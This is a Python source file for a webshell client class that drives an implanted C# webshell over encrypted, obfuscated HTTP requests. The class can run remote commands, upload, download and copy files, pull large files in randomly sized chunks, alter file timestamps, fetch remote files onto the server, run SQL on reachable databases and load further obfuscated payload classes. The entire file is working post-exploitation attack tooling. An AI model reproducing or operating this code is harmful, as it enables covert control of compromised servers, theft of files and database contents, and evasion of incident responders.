from datetime import datetime
from typing_extensions import List
from ..ReqParameter import ReqParameter
from ..base_shell import BaseShell
from .csharpPayload import CsharpPayload
from ..encryptPayload import encryptPayload
import hashlib
import requests
import gzip
from ..custom_request import CustomRequestBuilder
from typing import Optional, Dict, Union
import json
import time
class CsharpShell(BaseShell):
    def __init__(self, url: str, param_name: str, secret_key: str):
        super().__init__(url, param_name, secret_key)
        self.param_name = param_name
        self.secret_key = hashlib.md5(secret_key.encode()).hexdigest()[:16]  # 保持为字符串，供标记生成使用
        self.secret_key_bytes = self.secret_key.encode()  # 字节版本供AES加密使用 
        self.payload_manager = CsharpPayload()
        self.encryptPayload = encryptPayload(self.secret_key_bytes)
        
        self.request_format = 'form'
        self.request_format_file = None
        self.response_encrypt_type = 'aes_base64'
        
        self.session = requests.Session()
        self.session.verify = False
        self.session.proxies = None
        self.cookie_name = "X-Request-ID"
        self.timeout = 30

        print(f"[DEBUG] CsharpShell 使用的密钥是: {self.secret_key}")

  
    def init_payload(self, payload_name="payload"):
        self.request_cookie = self._generate_random_cookie(32)
        payload_content = self.payload_manager.getPayload(payload_name,self.secret_key,self.param_name,self.cookie_name,obfuscation_method="specified",specified_name="CCP")
        stager_key = self.request_cookie[:16] if len(self.request_cookie) > 16 else self.request_cookie
        init_encryptPayload = encryptPayload(stager_key.encode())
        encrypted_payload_content = init_encryptPayload.encryptAesBase64(payload_content)
        response = self.send_http_request(encrypted_payload_content, is_init_request=True)
        if response.status_code == 200:
            return True
        else:
            return False
    
    def eval_func(self, class_name: Optional[str], method_name: str, parameter: ReqParameter) -> Optional[bytes]:
        """
        调用服务端函数的通用方法
        
        Args:
            class_name: 类名（可选）
            method_name: 方法名
            parameter: 参数对象
            
        Returns:
            函数执行结果，失败返回None
        """
        
        # 添加必要的调用参数
        if class_name:
            parameter.add("className", class_name)
        parameter.add("methodName", method_name)
        
        # 格式化参数（未加密）
        formatted_params = parameter.format()

        # 生成请求cookie,用于生成请求标记
        self.request_cookie = self._generate_random_cookie(32)

        # 根据请求格式处理加密数据
        if self.request_format == "plain" or self.request_format == "xml" or self.request_format == "json":
            # 进行加密+Base64编码
            if "xor" in self.response_encrypt_type:
                encrypted_data = self.encryptPayload.encryptXorBase64(formatted_params).rstrip('=')
            elif "aes" in self.response_encrypt_type:
                encrypted_data = self.encryptPayload.encryptAesBase64(formatted_params).rstrip('=')
            else:
                encrypted_data = self.encryptPayload.encryptXorBase64(formatted_params).rstrip('=')
            req_left_marker, req_right_marker = self._generate_marker(self.request_cookie + "mark",self.secret_key)
            marked_encrypted_data = req_left_marker + encrypted_data + req_right_marker
        elif self.request_format == "png" or self.request_format == "plain_binary":
            # 进行加密（返回原始bytes）
            if "xor" in self.response_encrypt_type:
                encrypted_data = self.encryptPayload.encryptXorRaw(formatted_params)
            elif "aes" in self.response_encrypt_type:
                encrypted_data = self.encryptPayload.encryptAesRaw(formatted_params)
            else:
                encrypted_data = self.encryptPayload.encryptXorRaw(formatted_params)
            req_left_marker, req_right_marker = self._generate_binary_marker(self.request_cookie + "mark",self.secret_key)
            marked_encrypted_data = req_left_marker + encrypted_data + req_right_marker
        else:
            # form格式使用加密+Base64编码
            if "xor" in self.response_encrypt_type:
                marked_encrypted_data = self.encryptPayload.encryptXorBase64(formatted_params).rstrip('=')
            elif "aes" in self.response_encrypt_type:
                marked_encrypted_data = self.encryptPayload.encryptAesBase64(formatted_params).rstrip('=')
            else:
                marked_encrypted_data = self.encryptPayload.encryptXorBase64(formatted_params).rstrip('=')
        
        # 发送请求（非初始化请求，会使用标记定位法）
        # 发送HTTP请求（带重试逻辑）
        max_retries = 3
        for retry_count in range(max_retries + 1):
            response = self.send_http_request(marked_encrypted_data, is_init_request=False)
            
            # 如果返回None，表示遇到500错误，需要重新初始化
            if response.status_code == 500:
                if retry_count < max_retries:
                    print(f"[DEBUG] 第{retry_count + 1}次重试：重新初始化payload")
                    try:
                        # 重新初始化payload（使用原有的class_name和webshell_id）
                        class_name_pattern = f"mainPayload_{self.response_encrypt_type}"
                        self.init_payload(class_name=class_name_pattern)
                        continue  # 继续下一次重试
                    except Exception as init_error:
                        print(f"[DEBUG] 重新初始化失败: {init_error}")
                        continue
                else:
                    print(f"[DEBUG] 重试{max_retries}次后仍然失败，放弃")
                    return b"ERROR: Maximum retries exceeded"
            else:
                # 请求成功，跳出重试循环
                break
        else:
            # 如果循环正常结束（没有break），说明所有重试都失败了
            return b"ERROR: All retries failed"
        

        if response.status_code == 200 and response.content:
            if "xor_base64" in self.response_encrypt_type:
                return self.parse_response_xor_base64(response.content.decode('utf-8', errors='ignore'))
            elif "xor_raw" in self.response_encrypt_type:
                # xor_raw 模式直接传递二进制数据，不解码
                return self.parse_response_xor_raw(response.content)
            elif "aes_base64" in self.response_encrypt_type:
                return self.parse_response_aes_base64(response.content.decode('utf-8', errors='ignore'))
            elif "aes_raw" in self.response_encrypt_type:
                # aes_raw 模式直接传递二进制数据，不解码
                return self.parse_response_aes_raw(response.content)
            else:
                return self.parse_response_xor_base64(response.content.decode('utf-8', errors='ignore'))
        else:
            print(f"[ERROR] HTTP响应失败，状态码: {response.status_code}")
            return None
    
    def send_http_request(self, encrypted_data, is_init_request=False) -> Optional[tuple]:
        """
        发送请求到webshell
        
        Args:
            encrypted_data: 加密的请求数据，可能包含左右标记
            isInitRequest: 是否是初始化请求
        Returns:
            返回response对象，失败返回None
        """
        try:
            request_data = encrypted_data

            # 初始化自定义请求构建器
            self.custom_request_builder = CustomRequestBuilder(
                secret_key=self.secret_key, 
                param_name=self.param_name,
                config_file=self.request_format_file
            )

            # 如果不是初始化请求，使用标记定位法
            if not is_init_request:      
                # 使用自定义请求构建器创建请求体
                request_data, content_type = self.custom_request_builder.create_request_body(
                    encrypted_data=encrypted_data,
                    request_format=self.request_format
                )

            else:
                request_data, content_type = self.custom_request_builder.create_request_body(
                    encrypted_data=encrypted_data,
                    request_format="form"
                )
            
            headers = self.session.headers.copy()
            headers['Content-Type'] = content_type
            self.session.cookies.set(self.cookie_name, self.request_cookie)
            response = self.session.post(
                self.url, 
                data=request_data, 
                timeout=self.timeout,
                allow_redirects=False,
                headers=headers
            )
            
            return response
            
        except requests.exceptions.Timeout:
            print("[ERROR] 请求超时")
            return None
        except requests.exceptions.ConnectionError:
            print("[ERROR] 连接失败")
            return None
        except Exception as e:
            print(f"[ERROR] 请求失败: {e}")
            return None

    def parse_response_xor_base64(self, response_data: str) -> Optional[bytes]:
        """
        解码响应数据：使用Base64编码的标记定位后Base64解码和XOR解密
        支持纯Base64字符串和JSON格式的响应
        
        Args:
            response_data: 服务器响应的原始数据（Base64格式或JSON格式）
            
        Returns:
            解码后的数据，失败返回None
        """
        try:
            # 生成响应的左右标记（Base64格式）
            left_marker_base64, right_marker_base64 = self._generate_marker(self.request_cookie, self.secret_key)
            
            # 尝试解析JSON格式（如果是JSON响应，自动查找包含标记的字段）
            if response_data.strip().startswith('{'):
                try:
                    response_json = json.loads(response_data)
                    # 如果是JSON格式，遍历所有字段值查找包含左标记的字段
                    if isinstance(response_json, dict):
                        for key, value in response_json.items():
                            if isinstance(value, str) and left_marker_base64 in value:
                                response_data = value
                                print(f"[DEBUG] 检测到JSON响应，已从 '{key}' 字段提取加密数据")
                                break
                except json.JSONDecodeError:
                    # 不是有效的JSON，继续按纯字符串处理
                    pass
            
            # 查找Base64编码的左右标记位置（无等号版本）
            left_pos = response_data.find(left_marker_base64)
            right_pos = response_data.rfind(right_marker_base64)
            
            if left_pos == -1 or right_pos == -1 or left_pos >= right_pos:
                print(f"[DEBUG] 响应标记定位失败")
                print(f"[DEBUG] 期望的Base64标记 左: {left_marker_base64}, 右: {right_marker_base64}")
                print(f"[DEBUG] 响应数据: {response_data[:100]}...")
                return None
            
            # 提取中间的加密数据（Base64格式，无填充符）
            # Base64标记长度为11字符（8字节二进制 -> 12字符Base64 -> 去除等号后11字符）
            encrypted_data_base64 = response_data[left_pos + len(left_marker_base64):right_pos]
            
            # 重新添加必要的填充符（因为服务端去除了等号）
            missing_padding = (4 - len(encrypted_data_base64) % 4) % 4
            if missing_padding:
                encrypted_data_base64 += '=' * missing_padding
            
            # XOR解密 - 对bytes数据进行解密
            decrypted_data = self.encryptPayload.decryptXorBase64(encrypted_data_base64)
            
            # 检查是否是gzip压缩数据并解压
            if len(decrypted_data) >= 2 and decrypted_data[0] == 0x1f and decrypted_data[1] == 0x8b:
                try:
                    return gzip.decompress(decrypted_data)
                except Exception as gzip_error:
                    print(f"[ERROR] Gzip解压失败: {gzip_error}")
                    return decrypted_data
            else:
                return decrypted_data
            
        except Exception as e:
            print(f"[ERROR] 解码响应数据失败: {e}")
            import traceback
            traceback.print_exc()
            return None

    def parse_response_xor_raw(self, response_data: bytes) -> Optional[bytes]:
        """
        解码响应数据：使用二进制标记定位后XOR解密（xor_raw模式）
        
        Args:
            response_data: 服务器响应的原始二进制数据
            
        Returns:
            解码后的数据，失败返回None
        """
        try:
            # 生成响应的二进制左右标记（使用 request_cookie，与服务端一致）
            left_marker, right_marker = self._generate_binary_marker(self.request_cookie, self.secret_key)
            
            # 查找左右标记的位置（二进制搜索）
            left_pos = response_data.find(left_marker)
            right_pos = response_data.rfind(right_marker)
            
            if left_pos == -1 or right_pos == -1 or left_pos >= right_pos:
                print(f"[DEBUG] 响应标记定位失败")
                print(f"[DEBUG] 期望的响应标记 左: {left_marker.hex()}, 右: {right_marker.hex()}")
                return None
            
            # 提取被标记包裹的加密数据（纯二进制，无Base64）
            # 二进制标记长度为8字节
            encrypted_data = response_data[left_pos + 8:right_pos]
            
            # XOR解密 - 对bytes数据进行解密
            decrypted_data = self.encryptPayload.decryptXorRaw(encrypted_data)
            
            # 检查是否是gzip压缩数据并解压
            if len(decrypted_data) >= 2 and decrypted_data[0] == 0x1f and decrypted_data[1] == 0x8b:
                try:
                    return gzip.decompress(decrypted_data)
                except Exception as gzip_error:
                    print(f"[ERROR] Gzip解压失败: {gzip_error}")
                    return decrypted_data
            else:
                return decrypted_data
            
        except Exception as e:
            print(f"[ERROR] 解码响应数据失败: {e}")
            return None
            
    def parse_response_aes_base64(self, response_data: str) -> Optional[bytes]:
        """
        解码响应数据：使用Base64编码的标记定位后Base64解码和AES解密
        支持纯Base64字符串和JSON格式的响应
        
        Args:
            response_data: 服务器响应的原始数据（Base64格式或JSON格式）
            
        Returns:
            解码后的数据，失败返回None
        """
        try:
            # 生成响应的左右标记（Base64格式）
            left_marker_base64, right_marker_base64 = self._generate_marker(self.request_cookie, self.secret_key)
            
            # 尝试解析JSON格式（如果是JSON响应，自动查找包含标记的字段）
            if response_data.strip().startswith('{'):
                try:
                    response_json = json.loads(response_data)
                    # 如果是JSON格式，遍历所有字段值查找包含左标记的字段
                    if isinstance(response_json, dict):
                        for key, value in response_json.items():
                            if isinstance(value, str) and left_marker_base64 in value:
                                response_data = value
                                print(f"[DEBUG] 检测到JSON响应，已从 '{key}' 字段提取加密数据")
                                break
                except json.JSONDecodeError:
                    # 不是有效的JSON，继续按纯字符串处理
                    pass
            
            # 查找Base64编码的左右标记位置（无等号版本）
            left_pos = response_data.find(left_marker_base64)
            right_pos = response_data.rfind(right_marker_base64)
            
            if left_pos == -1 or right_pos == -1 or left_pos >= right_pos:
                print(f"[DEBUG] 响应标记定位失败")
                print(f"[DEBUG] 期望的Base64标记 左: {left_marker_base64}, 右: {right_marker_base64}")
                print(f"[DEBUG] 响应数据: {response_data[:100]}...")
                return None
            
            # 提取中间的加密数据（Base64格式，无填充符）
            encrypted_data_base64 = response_data[left_pos + len(left_marker_base64):right_pos]
            
            # 重新添加必要的填充符（因为服务端去除了等号）
            missing_padding = (4 - len(encrypted_data_base64) % 4) % 4
            if missing_padding:
                encrypted_data_base64 += '=' * missing_padding
            
            # AES解密 - 对bytes数据进行解密
            decrypted_data = self.encryptPayload.decryptAesBase64(encrypted_data_base64)
            
            # 检查是否是gzip压缩数据并解压
            if len(decrypted_data) >= 2 and decrypted_data[0] == 0x1f and decrypted_data[1] == 0x8b:
                try:
                    return gzip.decompress(decrypted_data)
                except Exception as gzip_error:
                    print(f"[ERROR] Gzip解压失败: {gzip_error}")
                    return decrypted_data
            else:
                return decrypted_data
            
        except Exception as e:
            print(f"[ERROR] 解码响应数据失败: {e}")
            import traceback
            traceback.print_exc()
            return None
    
    def parse_response_aes_raw(self, response_data: bytes) -> Optional[bytes]:
        """
        解码响应数据：使用二进制标记定位后AES解密（aes_raw模式）
        
        Args:
            response_data: 服务器响应的原始二进制数据
            
        Returns:
            解码后的数据，失败返回None
        """
        try:
            # 生成响应的二进制左右标记（使用 request_cookie，与服务端一致）
            left_marker, right_marker = self._generate_binary_marker(self.request_cookie, self.secret_key)
            
            # 查找左右标记的位置（二进制搜索）
            left_pos = response_data.find(left_marker)
            right_pos = response_data.rfind(right_marker)
            
            if left_pos == -1 or right_pos == -1 or left_pos >= right_pos:
                print(f"[DEBUG] 响应标记定位失败")
                print(f"[DEBUG] 期望的响应标记 左: {left_marker.hex()}, 右: {right_marker.hex()}")
                return None
            
            # 提取被标记包裹的加密数据（纯二进制）
            encrypted_data = response_data[left_pos + 8:right_pos]
            
            # AES解密 - 对bytes数据进行解密
            decrypted_data = self.encryptPayload.decryptAesRaw(encrypted_data)
            
            # 检查是否是gzip压缩数据并解压
            if len(decrypted_data) >= 2 and decrypted_data[0] == 0x1f and decrypted_data[1] == 0x8b:
                try:
                    return gzip.decompress(decrypted_data)
                except Exception as gzip_error:
                    print(f"[ERROR] Gzip解压失败: {gzip_error}")
                    return decrypted_data
            else:
                return decrypted_data
            
        except Exception as e:
            print(f"[ERROR] 解码响应数据失败: {e}")
            return None
    
    def test(self) -> bool:
        parameter = ReqParameter()
        result_bytes = self.eval_func(None, "test", parameter)
        if result_bytes is None:
            print("[ERROR] 连接测试失败")
            return False
        if result_bytes == b"ok":
            return True
        else:
            return False  
    
    def get_basic_info(self):
        # 创建参数对象
        parameter = ReqParameter()
        # 调用getBasicsInfo函数
        result_bytes = self.eval_func(None, "getBasicsInfo", parameter)
        if result_bytes is None:
            print("[ERROR] 获取系统信息失败")
            return None
        # 解析结果
        result_text = self._decode_response_text(result_bytes)
        if not result_text:
            print("[ERROR] 系统信息为空")
            return None

        # 解析键值对格式的结果
        info_dict = {}
        for line in result_text.strip().split('\n'):
            if ':' in line:
                key, value = line.split(':', 1)
                info_dict[key.strip()] = value.strip()
        
        self.system_info = info_dict
        return info_dict

    def get_CurrentDir(self):
        """获取当前目录"""
        current_dir = self.system_info.get("CurrentDir").replace("\\", "/")
        if current_dir:
            return current_dir
        else:
            return None
        
    def execute_command(self, command: str):
        parameter = ReqParameter()
        parameter.add("cmdLine", command)
        result_bytes = self.eval_func(None, "execCommand", parameter)
        if result_bytes is None:
            print("[ERROR] execute_command执行命令失败")
            return None
        result_text = self._decode_response_text(result_bytes)
        print("[Debug] execute_command执行命令结果：", result_text[:200])  # 只打印前200个字符
        return result_text

    def copy_file(self, src_file_path: str, dest_file_path: str):
        parameter = ReqParameter()
        parameter.add("srcFileName", src_file_path)
        parameter.add("destFileName", dest_file_path)
        result_bytes = self.eval_func(None, "copyFile", parameter)
        if result_bytes is None:
            print("[ERROR] copy_file执行失败")
            return False
        result_text = self._decode_response_text(result_bytes)
        return result_text.strip().lower().startswith("ok")
    
    def delete_file(self, file_path: str):
        parameter = ReqParameter()
        parameter.add("fileName", file_path)
        result_bytes = self.eval_func(None, "deleteFile", parameter)
        if result_bytes is None:
            print("[ERROR] delete_file执行失败")
            return False
        result_text = self._decode_response_text(result_bytes)
        return result_text.strip().lower().startswith("ok")
    
    def new_file(self, file_path: str):
        parameter = ReqParameter()
        parameter.add("fileName", file_path)
        result_bytes = self.eval_func(None, "newFile", parameter)
        if result_bytes is None:
            print("[ERROR] new_file执行失败")
            return False
        result_text = self._decode_response_text(result_bytes)
        return result_text.strip().lower().startswith("ok")
    
    def new_dir(self, dir_path: str):
        parameter = ReqParameter()
        parameter.add("dirName", dir_path)
        result_bytes = self.eval_func(None, "newDir", parameter)
        if result_bytes is None:
            print("[ERROR] new_dir执行失败")
            return False
        result_text = self._decode_response_text(result_bytes)
        return result_text.strip().lower().startswith("ok")
    
    def upload_file(self, file_path: str, file_content: bytes):
        parameter = ReqParameter()
        parameter.add("fileName", file_path)
        parameter.add("fileValue", file_content)
        result_bytes = self.eval_func(None, "uploadFile", parameter)
        if result_bytes is None:
            print("[ERROR] upload_file执行失败")
            return False
        result_text = self._decode_response_text(result_bytes)
        return result_text.strip().lower().startswith("ok")
    
    def download_file(self, file_path: str):
        parameter = ReqParameter()
        parameter.add("fileName", file_path)
        result_bytes = self.eval_func(None, "readFile", parameter)
        if result_bytes is None:
            print("[ERROR] download_file执行失败")
            return None
        return result_bytes
    
    def get_files(self, path: str):
        parameter = ReqParameter()
        parameter.add("dirName", path)
        result_bytes = self.eval_func(None, "getFile", parameter)
        result_text = result_bytes.decode('utf-8', errors='ignore')
        if "ok" not in result_text:
            print(f"[DEBUG] 获取文件列表失败: {result_text}")
            return None
        #print(f"[DEBUG] 获取文件列表成功: {result_text}")
        file_list = self.parse_file_list_text(result_text.split("ok")[1])
        return file_list
    
    def move_file(self, src_file_path: str, dest_file_path: str):
        parameter = ReqParameter()
        parameter.add("srcFileName", src_file_path)
        parameter.add("destFileName", dest_file_path)
        result_bytes = self.eval_func(None, "moveFile", parameter)
        if result_bytes is None:
            print("[ERROR] move_file执行失败")
            return False
        result_text = self._decode_response_text(result_bytes)
        return result_text.strip().lower().startswith("ok")

    def set_file_time(self, file_path: str, time_list: List[str]) -> bool:
        """
        设置文件时间属性
        :param fileName: 文件路径
        :param time: 时间列表：[修改时间, 访问时间, 创建时间]，使用"none"表示不修改该属性
        :return: 操作结果
        """
        parameter = ReqParameter()
        
        # 只接受列表参数
        if not isinstance(time_list, (list, tuple)):
            raise ValueError("time_list 参数必须是列表：[修改时间, 访问时间, 创建时间]")
        
        if len(time_list) != 3:
            raise ValueError("时间列表必须包含2个元素：[修改时间, 访问时间, 创建时间]")
        
        time_parts = []
        for t in time_list:
            if t is None or t == "none" or str(t).lower() == "none":
                time_parts.append("none")
            else:
                # 转换时间字符串为时间戳
                dt_object = datetime.strptime(str(t), "%Y-%m-%d %H:%M:%S")
                sec_timestamp = dt_object.timestamp()
                sec_timestamp_str = str(int(sec_timestamp))
                time_parts.append(sec_timestamp_str)
        
        # 用 "|" 连接时间戳
        time_attr = "|".join(time_parts)

        parameter.add("fileName", file_path)
        parameter.add("attr", time_attr)
        parameter.add("type", "fileTimeAttr")
        result_bytes = self.eval_func(None, "setFileAttr", parameter)
        result_text = self._decode_response_text(result_bytes)
        
        if "ok" not in result_text:
            print(f"[DEBUG] 设置文件时间失败: {result_text}")
            return False
        print(f"[DEBUG] 设置文件时间成功")
        return True
    
    def set_file_permission(self, file_path: str, permission: str) -> bool:
        """
        设置文件权限
        """
        parameter = ReqParameter()
        parameter.add("fileName", file_path)
        parameter.add("attr", permission)
        parameter.add("type", "fileBasicAttr")
        result_bytes = self.eval_func(None, "setFileAttr", parameter)
        result_text = self._decode_response_text(result_bytes)
        if "ok" not in result_text:
            print(f"[DEBUG] 设置文件权限失败: {result_text}")
            return False
        print(f"[DEBUG] 设置文件权限成功: {result_text}")
        return True

    def file_remote_download(self, url: str, save_file: str) -> bool:
        """
        从远程URL下载文件并保存到本地
        
        Args:
            url: 远程文件URL
            save_file: 保存路径
            
        Returns:
            bool: 下载成功返回True，失败返回False
        """
        parameter = ReqParameter()
        parameter.add("url", url)
        parameter.add("saveFile", save_file)
        result_bytes = self.eval_func(None, "fileRemoteDown", parameter)
        result_text = self._decode_response_text(result_bytes)
        if "ok" not in result_text:
            print(f"[DEBUG] 远程下载文件失败: {result_text}")
            return False
        print(f"[DEBUG] 远程下载文件成功: {result_text}")
        return True
    
    def get_file_size(self, file_path: str) -> int:
        """
        获取文件大小
        """
        try:
            parameter = ReqParameter()
            parameter.add("fileName", file_path)
            result_bytes = self.eval_func(None, "getFileSize", parameter)
            result_text = self._decode_response_text(result_bytes)
            return int(result_text.strip())
        except Exception as e:
            print(f"[ERROR] 获取文件大小异常: {result_text}")
            return None
    
    def read_file_by_position(self, file_path: str, position: int, read_byte_num: int) -> bytes:
        """
        读取文件指定位置和长度的数据块
        """
        """按位置读取文件数据块"""
        parameter = ReqParameter()
        parameter.add("fileName", file_path)
        parameter.add("position", str(position))
        parameter.add("readByteNum", str(read_byte_num))
        result_bytes = self.eval_func(None, "readFileByPosition", parameter)
        return result_bytes

    def big_file_download(self, file_path: str, save_path: Optional[str] = None, chunk_kb_size: Optional[int] = None, timeout: float = 0, enable_chunk_size_variation: bool = False, chunk_size_variation_kb: int = 128) -> bool:
        """
        大文件下载实现
        
        Args:
            filename: 服务器上要下载的文件路径
            save_path: 本地保存路径，如果为None则使用原文件名
            chunk_kb_size: 以kb为单位，每次读取的块大小，如果为None则动态计算
            timeout: 每次读取块之间的延迟时间，单位为秒，默认0秒
            enable_chunk_size_variation: 是否启用块大小浮动，默认False
            chunk_size_variation_kb: 块大小浮动范围（KB），默认128KB
        
        Returns:
            bool: 下载是否成功
        """
        try:
            print(f"[INFO] 开始下载大文件: {file_path}")
            
            # 1. 获取文件大小
            file_size = self.get_file_size(file_path)
            if file_size is None:
                print(f"[ERROR] 无法获取文件大小")
                return False
            
            print(f"[INFO] 文件大小: {file_size} 字节")
            
            # 2. 如果未提供块大小，则根据文件大小动态设置
            if chunk_kb_size is None:
                if file_size < 1 * 1024 * 1024:  # < 1MB
                    chunk_kb_size = 64  # 64KB chunks
                elif file_size < 100 * 1024 * 1024: # < 100MB
                    chunk_kb_size = 512 # 512KB chunks
                else: # >= 100MB
                    chunk_kb_size = 1024 * 4 # 4MB chunks
                print(f"[INFO] 未指定块大小，根据文件大小自动设置为: {chunk_kb_size} KB")

            # 3. 确定保存路径和初始化变量
            if save_path is None:
                import os
                save_path = os.path.basename(file_path)
            
            base_chunk_size = chunk_kb_size * 1024
            
            # 打印块浮动配置信息
            if enable_chunk_size_variation:
                variation_bytes = chunk_size_variation_kb * 1024
                min_chunk_size = max(1024, base_chunk_size - variation_bytes)  # 最小1KB
                max_chunk_size = base_chunk_size + variation_bytes
                print(f"[INFO] 启用块大小浮动: 基础块大小 {chunk_kb_size}KB, 浮动范围 ±{chunk_size_variation_kb}KB")
                print(f"[INFO] 实际块大小范围: {min_chunk_size//1024}KB - {max_chunk_size//1024}KB")
            else:
                print(f"[INFO] 固定块大小: {chunk_kb_size}KB")
            
            # 4. 分块下载
            downloaded_data = b""
            position = 0
            chunk_index = 0
            
            while position < file_size:
                chunk_index += 1
                
                # 计算当前块的大小
                if enable_chunk_size_variation:
                    # 生成随机浮动的块大小
                    import random
                    variation_bytes = chunk_size_variation_kb * 1024
                    min_chunk_size = max(1024, base_chunk_size - variation_bytes)  # 最小1KB
                    max_chunk_size = base_chunk_size + variation_bytes
                    current_chunk_size = random.randint(min_chunk_size, max_chunk_size)
                else:
                    current_chunk_size = base_chunk_size
                
                # 确保不超出文件边界
                remaining_bytes = file_size - position
                actual_chunk_size = min(current_chunk_size, remaining_bytes)
                
                # 显示下载进度
                progress_percent = (position / file_size) * 100
                if enable_chunk_size_variation:
                    print(f"[INFO] 下载进度: 块{chunk_index} ({position}/{file_size}, {progress_percent:.1f}%) - 块大小: {actual_chunk_size//1024}KB")
                else:
                    print(f"[INFO] 下载进度: 块{chunk_index} ({position}/{file_size}, {progress_percent:.1f}%)")
                
                # 读取当前块
                chunk_data = self.read_file_by_position(file_path, position, actual_chunk_size)
                
                if len(chunk_data) == 0:
                    print(f"[ERROR] 读取块 {chunk_index} 失败，数据为空")
                    return False
                
                downloaded_data += chunk_data
                
                # 检查是否读取了预期的字节数
                if len(chunk_data) != actual_chunk_size:
                    print(f"[WARNING] 块 {chunk_index} 实际读取 {len(chunk_data)} 字节，期望 {actual_chunk_size} 字节")
                
                # 更新位置
                position += len(chunk_data)
                
                # 如果启用了延迟，则等待
                if timeout > 0:
                    time.sleep(timeout)
            # 5. 保存到本地文件
            try:
                with open(save_path, 'wb') as f:
                    f.write(downloaded_data)
                print(f"[SUCCESS] 文件下载完成: {save_path}")
                print(f"[INFO] 下载文件大小: {len(downloaded_data)} 字节")
                return True
            except Exception as save_error:
                print(f"[ERROR] 保存文件失败: {save_error}")
                return False
                
        except Exception as e:
            print(f"[ERROR] 大文件下载失败: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def big_file_upload(self, file_path: str, file_data: bytes, position: str = "0") -> bool:
        """
        大文件上传实现

        Args:
            file_path: 目标文件路径
            file_data: 文件数据块
            position: 写入位置
            
        Returns:
            bool: 上传成功返回True,失败返回False
        """
        parameter = ReqParameter()
        parameter.add("fileContents", file_data)
        parameter.add("fileName", file_path)
        parameter.add("position", position)
        result_bytes = self.eval_func(None, "bigFileUpload", parameter)
        if "ok" not in result_bytes.decode('utf-8', errors='ignore'):
            print(f"[DEBUG] 上传大文件失败: {result_bytes.decode('utf-8', errors='ignore')}")
            return False
        return True
   
    def zip(self, compress_paths: Union[str, List[str]], compress_file: str) -> bool:
        """
        压缩文件或目录

        Args:
            compress_paths: 要压缩的路径，可以是字符串（单个路径）或列表（多个路径）
            compress_file: 压缩后的文件路径
            
        Returns:
            bool: 压缩成功返回True，失败返回False
        """
        try:
            # 处理输入参数：统一转换为"|"分隔的字符串
            if isinstance(compress_paths, str):
                # 单个路径，直接使用
                paths_str = compress_paths
            elif isinstance(compress_paths, (list, tuple)):
                # 多个路径，用"|"连接
                paths_str = "|".join(compress_paths)
            else:
                raise ValueError("compress_paths 必须是字符串或列表")

            parameter = ReqParameter()
            parameter.add("compressPaths", paths_str)
            parameter.add("compressFile", compress_file)
            result_bytes = self.eval_func(None, "zip", parameter)
            return result_bytes.decode('utf-8', errors='ignore').strip() == "ok"
        except Exception as e:
            print(f"[ERROR] 压缩文件异常: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def unzip(self, compress_file: str, extract_dir: str) -> bool:
        """
        解压文件

        Args:
            compress_file: 压缩文件路径
            extract_dir: 解压目录路径
            
        Returns:
            bool: 解压成功返回True，失败返回False
        """
        try:
            parameter = ReqParameter()
            parameter.add("compressFile", compress_file)
            parameter.add("extractDir", extract_dir)
            result_bytes = self.eval_func(None, "unzip", parameter)
            return result_bytes.decode('utf-8', errors='ignore').strip() == "ok"
        except Exception as e:
            print(f"[ERROR] 解压文件异常: {e}")
            import traceback
            traceback.print_exc()
            return False

    def test_database_connection(self, db_type, db_host, db_port, db_username, db_password):
        """测试数据库连接"""
        parameter = ReqParameter()
        parameter.add("dbType", db_type)
        parameter.add("dbHost", db_host)
        parameter.add("dbPort", str(db_port))
        parameter.add("dbUsername", db_username)
        parameter.add("dbPassword", db_password)
        result_bytes = self.eval_func(None, "testConnection", parameter)
        result_text = result_bytes.decode('utf-8', errors='ignore')
        

        if "ok:" in result_text:
            print(f"[DEBUG] 数据库连接测试成功: {result_text}")
            return True, result_text
        else:
            print(f"[DEBUG] 数据库连接测试失败: {result_text}")
            return False, result_text
    
    def exec_sql(self, db_type, db_host, db_port, db_username, db_password, exec_type, exec_sql):
        """执行SQL查询"""
        parameter = ReqParameter()
        parameter.add("dbType", db_type)
        parameter.add("dbHost", db_host)
        parameter.add("dbPort", str(db_port))
        parameter.add("dbUsername", db_username)
        parameter.add("dbPassword", db_password)
        parameter.add("execType", exec_type)
        parameter.add("execSql", exec_sql)
        
        result_bytes = self.eval_func(None, "execSql", parameter)
        result_text = result_bytes.decode('utf-8', errors='ignore')
            
        if "error:" in result_text:
            print(f"[DEBUG] SQL执行失败: {result_text}")
            return False, result_text
        
        if exec_type.lower() == "select":
            if result_text.startswith("ok\n"):
                print(f"[DEBUG] SQL查询成功")
                # 去掉开头的"ok\n"
                return True, result_text[3:]
            else:
                print(f"[DEBUG] SQL查询失败: {result_text}")
                return False, result_text
        else:
            if "Query OK" in result_text:
                print(f"[DEBUG] SQL更新成功: {result_text}")
                return True, result_text[3:]
            else:
                print(f"[DEBUG] SQL更新失败: {result_text}")
                return False, result_text
    
    def test_function(self):
        """
        用于测试已补全的文件操作方法
        """
        if not hasattr(self, "test_base_dir") or not self.test_base_dir:
            print("[ERROR] test_base_dir未设置，请先设置测试目录路径")
            return None

        base_dir = self.test_base_dir.rstrip("/\\")
        suffix = str(int(time.time()))
        test_dir = f"{base_dir}/test_dir_{suffix}"
        src_file = f"{base_dir}/test_src_{suffix}.txt"
        copy_file = f"{base_dir}/test_copy_{suffix}.txt"
        moved_file = f"{base_dir}/test_moved_{suffix}.txt"

        results: Dict[str, bool] = {}
        results["new_dir"] = self.new_dir(test_dir)
        results["upload_file"] = self.upload_file(src_file, b"test_content")
        downloaded = self.download_file(src_file)
        results["download_file"] = downloaded == b"test_content"
        results["copy_file"] = self.copy_file(src_file, copy_file)
        results["move_file"] = self.move_file(src_file, moved_file)
        results["delete_moved"] = self.delete_file(moved_file)
        results["delete_copy"] = self.delete_file(copy_file)
        results["delete_dir"] = self.delete_file(test_dir)

        print("[DEBUG] test_function结果:", results)
        return results


    def include(self, classInfo, second_include=False):
        """
        加载类
        :param classInfo: 包含class_name和class_content的字典 或包含original_classname和obfuscation_name的字典
        :return: 加载结果
        """
        if second_include:
            classInfo = self.payload_manager.getPayload(payload_name=classInfo["class_name"],obfuscation_method='specified',specified_name=classInfo["obfuscation_name"])

        parameter = ReqParameter()
        parameter.add("codeName", classInfo["class_name"])
        parameter.add("binCode", classInfo["class_content"])
        result_bytes = self.eval_func(None, "include", parameter)
        if "ok" not in result_bytes.decode('utf-8', errors='ignore'):
            print(f"[DEBUG] 发送{classInfo['class_name']}类失败: {result_bytes.decode('utf-8', errors='ignore')}")
